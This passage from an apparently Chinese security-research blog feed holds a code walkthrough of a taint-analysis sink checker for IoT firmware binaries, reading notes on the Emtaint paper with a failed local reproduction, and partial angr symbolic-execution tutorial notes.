class="literal">True</span></span><br><span class="line">             name_bin = self._ct.p.loader.main_object.binary</span><br><span class="line">             self._report_alert_fun(<span class="string">&#x27;sink&#x27;</span>, name_bin, current_path, current_addr,</span><br><span class="line">                                    self._current_role_info[RoleInfo.DATAKEY],</span><br><span class="line">                                    pl_name=self._current_cpf_name, report_time=delta_t)</span><br><span class="line"></span><br><span class="line">         <span class="comment"># tainted call address and tainted parameters</span></span><br><span class="line">         bl = self._current_p.factory.block(current_addr)</span><br><span class="line">         <span class="comment"># 如果当前block中末尾是call，在不同的架构中也可能是jmp</span></span><br><span class="line">         <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(next_path.active) <span class="keyword">and</span> <span class="built_in">len</span>(next_path.unconstrained) <span class="keyword">and</span> bl.vex.jumpkind == <span class="string">&#x27;Ijk_Call&#x27;</span>:</span><br><span class="line">             cap = bl.capstone.insns[-<span class="number">1</span>]</span><br><span class="line">             vb = bl.vex</span><br><span class="line">             reg_jump = cap.insn.op_str</span><br><span class="line">             val_jump_reg = <span class="built_in">getattr</span>(next_path.unconstrained[<span class="number">0</span>].regs, reg_jump)</span><br><span class="line">             <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(vb.<span class="built_in">next</span>, <span class="string">&#x27;tmp&#x27;</span>):</span><br><span class="line">                 <span class="keyword">return</span></span><br><span class="line">             val_jump_tmp = next_path.unconstrained[<span class="number">0</span>].scratch.temps[vb.<span class="built_in">next</span>.tmp]</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> <span class="keyword">not</span> self.is_tainted_by_us(val_jump_reg) <span class="keyword">and</span> <span class="keyword">not</span> self.is_tainted_by_us(val_jump_tmp):</span><br><span class="line">                 <span class="comment"># 检查val_jump_reg是否指向tainted_data</span></span><br><span class="line">                 <span class="keyword">if</span> self._ct.is_or_points_to_tainted_data(val_jump_reg, next_path, unconstrained=<span class="literal">True</span>):</span><br><span class="line">                     nargs = get_arity(self._current_p, current_path.active[<span class="number">0</span>].addr)</span><br><span class="line">                     <span class="comment"># 找到jump的时候不同架构下用来传参的参数寄存器名字</span></span><br><span class="line">                     <span class="keyword">for</span> ord_reg <span class="keyword">in</span> ordered_argument_regs[self._current_p.arch.name][:nargs]:</span><br><span class="line">                         reg_name = self._current_p.arch.register_names[ord_reg]</span><br><span class="line">                         <span class="keyword">if</span> reg_name == reg_jump:</span><br><span class="line">                             <span class="keyword">continue</span></span><br><span class="line"><span class="comment"># 判断call的时候参数寄存器是否包含或者指向taint data，如果是就默认是alert</span></span><br><span class="line">                         reg_val = <span class="built_in">getattr</span>(next_path.unconstrained[<span class="number">0</span>].regs, reg_name)</span><br><span class="line">                         <span class="keyword">if</span> self._ct.is_or_points_to_tainted_data(reg_val, next_path,</span><br><span class="line">                                                                  unconstrained=<span class="literal">True</span>) <span class="keyword">and</span> self.is_address(reg_val):</span><br><span class="line">                             delta_t = time.time() - self._analysis_starting_time</span><br><span class="line">                             self._raised_alert = <span class="literal">True</span></span><br><span class="line">                             name_bin = self._ct.p.loader.main_object.binary</span><br><span class="line">                             self._report_alert_fun(<span class="string">&#x27;sink&#x27;</span>, name_bin, current_path, current_addr,</span><br><span class="line">                                                    self._current_role_info[RoleInfo.DATAKEY],</span><br><span class="line">                                                    pl_name=self._current_cpf_name, report_time=delta_t)</span><br><span class="line"></span><br><span class="line">                     next_state = next_path.unconstrained[<span class="number">0</span>]</span><br><span class="line">                     hash_val = self.bv_to_hash(val_jump_tmp)</span><br><span class="line">                     self._taint_names_applied.append(hash_val)</span><br><span class="line">                     hash_val = self.bv_to_hash(val_jump_reg)</span><br><span class="line">                     self._taint_names_applied.append(hash_val)</span><br><span class="line">                     <span class="comment"># 将next_state对应的函数中各个参数taint</span></span><br><span class="line">                     self._apply_taint(current_addr, current_path, next_state)</span><br><span class="line">                     </span><br><span class="line">                             <span class="comment">### _apply_taint如下所示</span></span><br><span class="line">                             <span class="keyword">def</span> <span class="title function_">_apply_taint</span>(<span class="params">self, addr, current_path, next_state, taint_key=<span class="literal">False</span></span>):</span><br><span class="line">                                 <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                                 Applies the taint to the role function call</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                 :param addr: address of the role function</span></span><br><span class="line"><span class="string">                                 :param current_path: current angr&#x27;s path</span></span><br><span class="line"><span class="string">                                 :param next_state: state at the entry of the function</span></span><br><span class="line"><span class="string">                                 :return:</span></span><br><span class="line"><span class="string">                                 &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">                                 <span class="keyword">def</span> <span class="title function_">is_arg_key</span>(<span class="params">arg</span>):</span><br><span class="line">                                     <span class="keyword">return</span> <span class="built_in">hasattr</span>(arg, <span class="string">&#x27;args&#x27;</span>) <span class="keyword">and</span> <span class="built_in">type</span>(arg.args[<span class="number">0</span>]) <span class="keyword">in</span> (<span class="built_in">int</span>, long) <span class="keyword">and</span> arg.args[<span class="number">0</span>] == self._current_seed_addr</span><br><span class="line"></span><br><span class="line">                                 p = self._current_p</span><br><span class="line">                                 ins_args = get_ord_arguments_call(p, addr)</span><br><span class="line">                                 <span class="keyword">if</span> <span class="keyword">not</span> ins_args:</span><br><span class="line">                                     ins_args = get_any_arguments_call(p, addr)</span><br><span class="line"></span><br><span class="line">                                 <span class="keyword">if</span> <span class="keyword">not</span> are_parameters_in_registers(p):</span><br><span class="line">                                     <span class="keyword">raise</span> Exception(<span class="string">&quot;Parameters not in registers: Implement me&quot;</span>)</span><br><span class="line"></span><br><span class="line">                                 <span class="keyword">for</span> stmt <span class="keyword">in</span> ins_args:</span><br><span class="line">                                     reg_off = stmt.offset</span><br><span class="line">                                     reg_name = p.arch.register_names[reg_off]</span><br><span class="line">                                     val_arg = <span class="built_in">getattr</span>(next_state.regs, reg_name)</span><br><span class="line">                                     size = <span class="literal">None</span></span><br><span class="line">                                     <span class="keyword">if</span> is_arg_key(val_arg):</span><br><span class="line">                                         <span class="keyword">if</span> <span class="keyword">not</span> taint_key:</span><br><span class="line">                                             <span class="keyword">continue</span></span><br><span class="line">                                         n_bytes = p.loader.memory.read_bytes(val_arg.args[<span class="number">0</span>], STR_LEN)</span><br><span class="line">                                         size = <span class="built_in">len</span>(get_mem_string(n_bytes)) * <span class="number">8</span></span><br><span class="line">                                     <span class="keyword">if</span> val_arg.concrete <span class="keyword">and</span> val_arg.args[<span class="number">0</span>] &lt; p.loader.main_object.min_addr:</span><br><span class="line">                                         <span class="keyword">continue</span></span><br><span class="line">                                     log.info(<span class="string">&#x27;taint applied to %s:%s&#x27;</span> % (reg_name, <span class="built_in">str</span>(val_arg)))</span><br><span class="line">                                     self._ct.apply_taint(current_path, val_arg, reg_name, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         <span class="comment"># eventually if we are in a loop guarded by a tainted variable</span></span><br><span class="line">         next_active = next_path.active</span><br><span class="line">         <span class="keyword">if</span> <span class="built_in">len</span>(next_active) &gt; <span class="number">1</span>: <span class="comment"># 大于1说明可能是判断语句，也可能是循环导致</span></span><br><span class="line">             history_addrs = [t <span class="keyword">for</span> t <span class="keyword">in</span> current_state.history.bbl_addrs]</span><br><span class="line">             seen_addr = [a.addr <span class="keyword">for</span> a <span class="keyword">in</span> next_active <span class="keyword">if</span> a.addr <span class="keyword">in</span> history_addrs] <span class="comment"># 寻找当前地址是否出现在history 地址中</span></span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> <span class="built_in">len</span>(seen_addr) == <span class="number">0</span>:</span><br><span class="line">                 <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">             back_jumps = [a <span class="keyword">for</span> a <span class="keyword">in</span> seen_addr <span class="keyword">if</span> a &lt; current_addr]</span><br><span class="line">             <span class="keyword">if</span> <span class="built_in">len</span>(back_jumps) == <span class="number">0</span>:</span><br><span class="line">                 <span class="keyword">return</span></span><br><span class="line"><span class="comment"># 所有跳回中选择其中第一个</span></span><br><span class="line">             bj = back_jumps[<span class="number">0</span>]</span><br><span class="line">             node_s = cfg.get_any_node(bj)</span><br><span class="line">             node_f = cfg.get_any_node(current_addr)</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> <span class="keyword">not</span> node_s <span class="keyword">or</span> <span class="keyword">not</span> node_f:</span><br><span class="line">                 <span class="keyword">return</span></span><br><span class="line"><span class="comment"># 获取第一个跳回中basic block地址和当前basic block地址</span></span><br><span class="line">             fun_s = node_s.function_address</span><br><span class="line">             fun_f = node_f.function_address</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> fun_s != fun_f:</span><br><span class="line">                 <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">             idx_s = history_addrs.index(bj)</span><br><span class="line">             <span class="comment"># 从第一次出现当前地址往后开始找，确保所有跳回地址都是相同的，从而确保是跳回</span></span><br><span class="line">             <span class="keyword">for</span> a <span class="keyword">in</span> history_addrs[idx_s:]:</span><br><span class="line">                 n = cfg.get_any_node(a)</span><br><span class="line">                 <span class="keyword">if</span> <span class="keyword">not</span> n:</span><br><span class="line">                     <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                 <span class="keyword">if</span> n.function_address != fun_s:</span><br><span class="line">                     <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">             <span class="comment"># if we have a back-jump satisfiying all the conditions</span></span><br><span class="line">             cond_guard = [g <span class="keyword">for</span> g <span class="keyword">in</span> next_active[<span class="number">0</span>].guards][-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> <span class="built_in">hasattr</span>(cond_guard, <span class="string">&#x27;args&#x27;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(cond_guard.args) == <span class="number">2</span> <span class="keyword">and</span> \</span><br><span class="line">                     self._ct.taint_buf <span class="keyword">in</span> <span class="built_in">str</span>(cond_guard.args[<span class="number">0</span>]) <span class="keyword">and</span> \</span><br><span class="line">                     self._ct.taint_buf <span class="keyword">in</span> <span class="built_in">str</span>(cond_guard.args[<span class="number">1</span>]):</span><br><span class="line">                 delta_t = time.time() - self._analysis_starting_time</span><br><span class="line">                 self._raised_alert = <span class="literal">True</span></span><br><span class="line">                 name_bin = self._ct.p.loader.main_object.binary</span><br><span class="line">                 <span class="comment"># alert一个loop循环</span></span><br><span class="line">                 self._report_alert_fun(<span class="string">&#x27;loop&#x27;</span>, name_bin, current_path, current_addr, cond_guard,</span><br><span class="line">                                        pl_name=self._current_cpf_name, report_time=delta_t)</span><br><span class="line">     <span class="keyword">except</span> TimeOutException <span class="keyword">as</span> to:</span><br><span class="line">         <span class="keyword">raise</span> to</span><br><span class="line">     <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">         log.error(<span class="string">&quot;Something went terribly wrong: %s&quot;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当对于explore过程中每个basic block都应用上述算法之后，就可以汇报出来是否存在到达sink函数，到达时是否有污点信息了。在这之后，结束了<code>_vuln_analysis</code>阶段。这部分应该是直接复用了KARONTE的代码，使用的BDG。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    self._ct.run(s, (), (), summarized_f=summarized_f, force_thumb=<span class="literal">False</span>, check_func=self._check_sink,</span><br><span class="line">                 init_bss=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span> TimeOutException:</span><br><span class="line">    log.warning(<span class="string">&quot;Hard timeout triggered&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    log.error(<span class="string">&quot;Something went terribly wrong: %s&quot;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">self._ct.unset_alarm()</span><br><span class="line"></span><br><span class="line"><span class="comment"># stats</span></span><br><span class="line">self._stats[bdg_node.<span class="built_in">bin</span>][<span class="string">&#x27;to&#x27;</span>] += <span class="number">1</span> <span class="keyword">if</span> self._ct.triggered_to() <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">self._stats[bdg_node.<span class="built_in">bin</span>][<span class="string">&#x27;visited_bb&#x27;</span>] += self._visited_bb</span><br><span class="line">self._stats[bdg_node.<span class="built_in">bin</span>][<span class="string">&#x27;n_paths&#x27;</span>] += self._ct.n_paths</span><br><span class="line">self._stats[bdg_node.<span class="built_in">bin</span>][<span class="string">&#x27;ana_time&#x27;</span>] += (time.time() - ana_start_time)</span><br><span class="line">self._stats[bdg_node.<span class="built_in">bin</span>][<span class="string">&#x27;n_runs&#x27;</span>] += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来回退到bugFinder里面，这里调用了<code>_vuln_analysis</code>。后面则是仍然和KARONTE类似，在BDG中的child binary进行搜索。仍然是调用此函数，不再赘述了。</p><h2 id="问题-amp-amp-思考"><a href="#问题-amp-amp-思考" class="headerlink" title="问题&amp;&amp;思考"></a>问题&amp;&amp;思考</h2><p>在看代码的时候发现一个问题，一开始ghidra找到的所有path中，包含taint的部分虽然被提取出来了，但是使用的时候比较粗糙，只是在apply_taint中使用，用处是检验被call的函数是不是之前taint路径上的，如果能利用之前taint trace的内容对binary进行剪枝，可能可以加快处理时间，这部分或许可以参考beacon文章。</p>]]></content>
      
      
      <categories>
          
          <category> paper </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Emtaint_paper_reading</title>
      <link href="/2023/08/11/Emtaint-paper-reading/"/>
      <url>/2023/08/11/Emtaint-paper-reading/</url>
      
        <content type="html"><![CDATA[<p>Emtaint是来自中科大的一篇关于iot二进制安全分析的一篇论文，发表于ISSTA2023。文中提出了一种船新(也不完船新)的针对binary的变量污点分析\alias判断的策略。同时Emtaint说明了在iot binary中，处理inderect call的重要性。本文也复现了<a href="https://github.com/kuc001/EmTaint">论文给出的工具</a></p><span id="more"></span><h2 id="前人工作的问题"><a href="#前人工作的问题" class="headerlink" title="前人工作的问题"></a>前人工作的问题</h2><p>前人关于taint analysis做的相关研究以及存在的问题</p><ul><li>Karonte</li></ul><p>由于Karonte中对指针p传播之后的alias q打上不同的tag，导致若两个指针解引用到不同地址，将会消除两者的依赖关系，造成很高的false negative。</p><blockquote><p>但是我个人认为Karonte提出想要解决的问题并不是taint analysis准确性问题，而是cross binary的BDG(binary dependency graph)。这个tag的想法也是借鉴之前别的文章的。</p></blockquote><ul><li>基于VSA(value set analysis)的工作</li></ul><p>在VSA中，一个新生成的指针默认可以指向任何位置，造成很高的false positive</p><ul><li>inderect call的处理</li></ul><p>现有工作无法处理binary中的inderect call。什么是inderect call呢，以下是一个例子</p><p><img src="/2023/08/11/Emtaint-paper-reading/image-20230811113513718.png" alt="image-20230811113513718"></p><p>在indirect call中，将函数地址放在某个寄存器中，经过计算之后最终通过<code>call 寄存器</code>的形式完成调用。direct call和一般函数调用是类似的。在mips,riscv架构中，类似jmp $ra这样的形式非常常见，于是将会存在很多的indirect call。而以往基于CFG或CG的binary分析方法没法解决这种问题。</p><h2 id="创新点"><a href="#创新点" class="headerlink" title="创新点"></a>创新点</h2><p>Emtaint提出一种基于binary的SSE技术(structured symbolic execution)。由于原先的符号执行技术只能将算术操作考虑在内(可能是因为底层依赖于z3等约束求解库)，而不能考虑memory中的load和store。SSE可以将其考虑在内。并且用一套算法很方便的得到某个变量/寄存器的alias。</p><p>除此以外，Emtaint不需要从binary的入口处开始执行，而是可以从任意位置(例如常见的sink: recv(). websgetvar()开始执行)</p><h2 id="SSE-based-taint-analysis"><a href="#SSE-based-taint-analysis" class="headerlink" title="SSE-based taint analysis"></a>SSE-based taint analysis</h2><p>用下图说明。Emtaint过程中同时引入了forware checking和backward chhecking，从而确保变量之间的alias关系被充分挖掘了</p><p><img src="/2023/08/11/Emtaint-paper-reading/image-20230811120340192.png" alt="image-20230811120340192"></p><p>•如上图，如果想分析R1指针和什么alias。最终得到的下半部分是和R1alias的内容。</p><p>•如第三句，直接替换为[R3+0X8]</p><p>•之后发现R3存在于第二句，向上寻找，用第三句的框架中把R3替换成STORE(R2)(因为要得到所有第三句的alias)</p><p>•之后发现R2存在于第一句，继续向上分析…</p><p>•之后发现第四句中有R6，替换store(R6)因为第四句就是load</p><p>•直到第五句变成R0，发现alias为第五句中的R0</p><p>下图是Emtaint做内容替换基于的规则表</p><p><img src="/2023/08/11/Emtaint-paper-reading/image-20230811120625200.png" alt="image-20230811120625200"></p><h2 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h2><p>我的理解是，上述算法可以是一种更加精确的内存中的taint analysis方法，他可以有以下用途</p><ul><li><p>在basic block内部，用上面方法找到指定变量的alias</p></li><li><p>在function call中，对每一个callee所做的对参数、返回值访问的内存位置做summary(也是taint analysis)，找到modification 和reference。创建function summary。</p></li></ul><p>对于indirect call</p><ul><li>如果call附近有立即数，可能是取某个基地址加减之后jr $ra这样的形式，使用SSE分析可以解决真正call地址的问题</li></ul><p>然而Emtaint只能解决下面这类inderect call问题。对于上面用rip作为及地址加上一定距离调用函数还是无法做到的。</p><p><img src="/2023/08/11/Emtaint-paper-reading/image-20230811121416640.png" alt="image-20230811121416640"></p><h2 id="vul-detection"><a href="#vul-detection" class="headerlink" title="vul detection"></a>vul detection</h2><p>目前Emtaint主要关注data-copy、system()类型的数据复制或者命令执行相关api的taint analysis。在传播污点数据时和平常工具一样，会记录下constraint信息，并在sink位置时查看是否存在比栈buffer小的限制等。</p><h2 id="evaluation"><a href="#evaluation" class="headerlink" title="evaluation"></a>evaluation</h2><p>首先作者测试了inderect call在binary中的重要性，可以发现加上I-call resolution之后，发现的alert多出了奖金三倍</p><p><img src="/2023/08/11/Emtaint-paper-reading/image-20230811124637527.png" alt="image-20230811124637527"></p><p>之后作者将此工具和SaTC，Emtaint对比，结果如下所示。无论在时间上还是TP的比例上都高出一截。</p><p><img src="/2023/08/11/Emtaint-paper-reading/image-20230811124729226.png" alt="image-20230811124729226"></p><p>另外，可以看到TP的比例也非常高</p><p><img src="/2023/08/11/Emtaint-paper-reading/image-20230811125545908.png" alt="image-20230811125545908"></p><h1 id="本地实验"><a href="#本地实验" class="headerlink" title="本地实验"></a>本地实验</h1><p>按照官网给出的教程，我本地对此工具进行了实验。不过中途遇到了非常多的报错。首先是IDA版本，原先的ida script时6.8~7.3的IDA，在7.3之后需要大量更换旧API。之后运行脚本也会出错</p><p><img src="/2023/08/11/Emtaint-paper-reading/image-20230811130219538.png" alt="image-20230811130219538"></p><p>在<code>generate_cfg.py</code>这里添加上错误检验之后</p><p><img src="/2023/08/11/Emtaint-paper-reading/image-20230811130415600.png" alt="image-20230811130415600"></p><p>虽然能够运行成功，但是可以看到找到的inderect call和vulnerbility都非常少</p><p><img src="/2023/08/11/Emtaint-paper-reading/image-20230811130537837.png" alt="image-20230811130537837"></p><p>所以就不想分析源码了，或者等后面有时间改一改mips的ida插件，多分析一些别的。但是实际上这个binary里面像是strncpy,sprintf这些api都是存在的，不知道为什么这个工具无法解析。</p>]]></content>
      
      
      <categories>
          
          <category> paper </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angr-basic</title>
      <link href="/2023/08/01/angr-basic/"/>
      <url>/2023/08/01/angr-basic/</url>
      
        <content type="html"><![CDATA[<p>学习<a href="https://docs.angr.io/">https://docs.angr.io/</a> 中cure concepts的学习笔记和一些思考</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次想学习angr的主要目的是想要做一些data-flow analysis，因为想到了一个关于iot漏洞检测的一个比较有意思的idea，想要自己先试验一下。</p><p>docs.angr.io提供了一些关于core concept的解释，希望可以通过将这些core concept应用在这个mips binary的数据流分析上。</p><h2 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><h3 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h3><p>加载二进制文件过程中，可以通过一些API判断加载的起始地址和最终地址，并判断这个二进制文件是有可执行栈还是PIE。</p><h3 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h3><p>这个不知道怎么翻译了…,可能指的是模块。angr有很多模块，例如blocks，可以提供基本块的解析，并且解析出指令内容，指令地址，指令数量。</p><p><img src="/2023/08/01/angr-basic/image-20230802114515776.png" alt="image-20230802114515776"></p><h3 id="state"><a href="#state" class="headerlink" title="state"></a>state</h3><p>此外，angr在加载完文件之后只是一个”被初始化的image”，在模拟执行的过程中，需要一些state。因此angr内部还包括模拟的程序状态，<code>SimState</code>。</p><p><img src="/2023/08/01/angr-basic/image-20230802114708883.png" alt="image-20230802114708883"></p><p><img src="/2023/08/01/angr-basic/image-20230802114705175.png" alt="image-20230802114705175"></p><p>在state中，所有数字都是用bitvec表示的，这一点在后面也会提到。除此以外，程序还需要有内存，这就是<code>mem</code>。</p><p><img src="/2023/08/01/angr-basic/image-20230802114941840.png" alt="image-20230802114941840"></p><p>对于<code>mem</code>的数据，使用<code>resolved</code>可以将其变为<code>bitvec</code>，使用<code>type</code>可以将其解释称不同的类型。(原来angr也有state，一直以为只有类似unicorn的模拟执行工具才会有)</p><p>然而有的时候当我们查看运行中程序的内存时，会发现显示的并不是一个数值，而是一个符号。因此这也被称为<strong>符号执行</strong>。下面的rdi寄存器储存的，就是一个符号。</p><p><img src="/2023/08/01/angr-basic/image-20230802115213341.png" alt="image-20230802115213341"></p><h3 id="simulation-manager"><a href="#simulation-manager" class="headerlink" title="simulation manager"></a>simulation manager</h3><p>上述的state只是表示了一个<strong>具体时刻的</strong>程序状态，如果想要真正运行起来，完成完整的模拟，还有一个重要的概念是<strong>Simulation Managers</strong>。下面是建立一个<code>simulation</code>的具体方式，一个simulation可以接受一个或者一个list的states。</p><p><img src="/2023/08/01/angr-basic/image-20230802115636936.png" alt="image-20230802115636936"></p><p>使用<code>step()</code>方法完成一次符号执行</p><p><img src="/2023/08/01/angr-basic/image-20230802115808785.png" alt="image-20230802115808785"></p><p>接下来看寄存器、内存就可以发现部分内容发生了变化</p><p><img src="/2023/08/01/angr-basic/image-20230802115847445.png" alt="image-20230802115847445"></p><p>最后，<code>angr</code>的相关API文档都在<a href="https://docs.angr.io/en/latest/api.html#module-angr.analyses">API Reference - angr documentation</a>中，可以方便查阅</p><h2 id="加载二进制文件"><a href="#加载二进制文件" class="headerlink" title="加载二进制文件"></a>加载二进制文件</h2><p>angr中，负责加载二进制的部分叫做<code>CLE</code>(全称是CLE Loads Everything)，它负责将binary以及其相关的链接库加载到angr中进行分析。</p><p>使用<code>loader.all_projects</code>可以得到所有被CLE加载的内容</p><p><img src="/2023/08/01/angr-basic/image-20230801134051884.png" alt="image-20230801134051884"></p><p>还可以通过<code>main_object</code>和<code>shared_object</code>找到关于主函数和一些共享库的映射。这里由于架构问题，导致没有成功解析出共享库。</p><p><img src="/2023/08/01/angr-basic/image-20230801134411503.png" alt="image-20230801134411503"></p><p>通过指定每一个object，可以确定一些object特殊相关的性质。然而，在mips32架构下，似乎angr无法解析PLT。</p><p><img src="/2023/08/01/angr-basic/image-20230801134958928.png" alt="image-20230801134958928"></p><p><img src="/2023/08/01/angr-basic/image-20230801135007433.png" alt="image-20230801135007433"></p><p>通过寻找symbols的方式可以找到memset的符号位置，但是这个地址应该不是binary中的。</p><p><img src="/2023/08/01/angr-basic/image-20230801135154222.png" alt="image-20230801135154222"></p><blockquote><p>疑问：那么SaTC是怎么找到一些sink函数的，可能需要看他们的代码</p></blockquote><h3 id="加载选项"><a href="#加载选项" class="headerlink" title="加载选项"></a>加载选项</h3><p>在使用默认加载方式之外，还可以指定一些加载选项，有以下几种</p><p><img src="/2023/08/01/angr-basic/image-20230801140114101.png" alt="image-20230801140114101"></p><p>主要是backend比较难理解，这个指的是对于不同文件类型选择的不同加载方式。例如ELF、PE、mach-o格式的文件。例如image文件可能不包含文件类型信息，需要手动指定。</p><p><img src="/2023/08/01/angr-basic/image-20230801140318629.png" alt="image-20230801140318629"></p><h3 id="function-hook"><a href="#function-hook" class="headerlink" title="function hook"></a>function hook</h3><p>由于调用libc比较麻烦，并且angr是基于python的，直接call c语言函数牵涉到链接、重定位等。因此angr用python重写了很多<a href="https://github.com/angr/angr/tree/master/angr/procedures">库函数</a>，并用他们来代替原先c库函数，成为<code>generic stub</code>。这些函数执行完成将返回一个<code>symbolic value</code>。但是只有部分函数可以被替代。一些比较复杂额例如malloc依然是无法替代的。</p><p>这一函数替代技术也被称为<code>hook</code>。angr在符号执行时，每一步都会检查当前地址是否被hook过，如果是，将会执行hook过后的地址的指令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用SIM_procedures，获取其中的object</span></span><br><span class="line">stub_func = angr.SIM_PROCEDURES[<span class="string">&#x27;stubs&#x27;</span>][<span class="string">&#x27;ReturnUnconstrained&#x27;</span>]</span><br><span class="line"><span class="comment"># 设置0x10000地址对应的hook函数为stub_func</span></span><br><span class="line">proj.hook(<span class="number">0x10000</span>, stub_func())  <span class="comment"># hook with an instance of the class</span></span><br><span class="line"><span class="comment"># 检查是否hook过</span></span><br><span class="line">proj.is_hooked(<span class="number">0x10000</span>)</span><br><span class="line">&gt;&gt; <span class="literal">True</span></span><br><span class="line"><span class="comment">## 自定义函数进行hook</span></span><br><span class="line"><span class="meta">@proj.hook(<span class="params"><span class="number">0x20000</span>, length=<span class="number">5</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_hook</span>(<span class="params">state</span>):</span><br><span class="line">    state.regs.rax = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">proj.is_hooked(<span class="number">0x20000</span>)</span><br><span class="line">&gt;&gt; <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>除此以外，还可以hook一些symbols对应的函数。这将我们hook一些危险api的使用变成现实。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proj.hook_symbol(name, hook)</span><br></pre></td></tr></table></figure><h2 id="符号执行、约束求解"><a href="#符号执行、约束求解" class="headerlink" title="符号执行、约束求解"></a>符号执行、约束求解</h2><h3 id="底层"><a href="#底层" class="headerlink" title="底层"></a>底层</h3><p>在angr底层，采用符号表示一个输入，那么符号是什么？他就是<code>BitVec</code>。BitVec表示不同比特大小的一段内存空间。对于BitVec的操作并不会直接计算，而是转化为抽象参数树，并以表达式的形式参与运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">x = state.solver.BVS(<span class="string">&quot;x&quot;</span>, <span class="number">64</span>)</span><br><span class="line">y = state.solver.BVS(<span class="string">&quot;y&quot;</span>, <span class="number">64</span>)</span><br><span class="line">tree = (x + <span class="number">1</span>) / (y + <span class="number">2</span>)</span><br><span class="line">&gt;&gt; &lt;BV64 (x_9_64 + <span class="number">0x1</span>) / (y_10_64 + <span class="number">0x2</span>)&gt;</span><br><span class="line"><span class="comment"># 输出operand，直接输出表示输出顶层的</span></span><br><span class="line"><span class="built_in">print</span>(tree.op)</span><br><span class="line">&gt;&gt; <span class="string">&#x27;__floordiv__&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(tree.args)</span><br><span class="line">&gt;&gt; (&lt;BV64 x_9_64 + <span class="number">0x1</span>&gt;, &lt;BV64 y_10_64 + <span class="number">0x2</span>&gt;)</span><br><span class="line"><span class="comment"># 输出子层的operand</span></span><br><span class="line"><span class="built_in">print</span>(tree.args[<span class="number">0</span>].op)</span><br><span class="line">&gt;&gt; <span class="string">&#x27;__add__&#x27;</span></span><br><span class="line"><span class="comment"># 输出计算表达式的中间参数</span></span><br><span class="line"><span class="built_in">print</span>(tree.args[<span class="number">0</span>].args[<span class="number">1</span>].args)</span><br><span class="line">&gt;&gt; (<span class="number">1</span>, <span class="number">64</span>)</span><br></pre></td></tr></table></figure><p>注意计算操作符下，生成的结果仍然是bitVec(上述输出的BV64符号)，但是比较操作符下，结果将变成<code>boolean</code>类型的。注意这里的比较默认是<code>unsigned</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x + y == one_hundred + <span class="number">5</span></span><br><span class="line">&gt;&gt; &lt;Bool (x_9_64 + y_10_64) == <span class="number">0x69</span>&gt;</span><br><span class="line"><span class="comment">## 有符号比较</span></span><br><span class="line">one_hundred.SGT(-<span class="number">5</span>)</span><br></pre></td></tr></table></figure><h3 id="约束求解"><a 